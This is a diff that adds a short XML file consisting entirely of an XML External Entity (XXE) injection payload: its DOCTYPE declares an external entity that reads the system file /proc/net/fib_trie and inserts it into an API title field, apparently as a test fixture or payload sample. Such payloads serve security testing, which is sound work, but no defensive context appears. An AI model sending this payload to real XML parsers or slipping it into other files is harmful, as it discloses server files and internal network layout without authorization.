@@ -1,0 +1,6 @@
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE api [
+  <!ELEMENT api ANY >
+  <!ENTITY xxe SYSTEM "file:///proc/net/fib_trie" >
+]>
+<api><title>&xxe;</title><url/><description/></api>
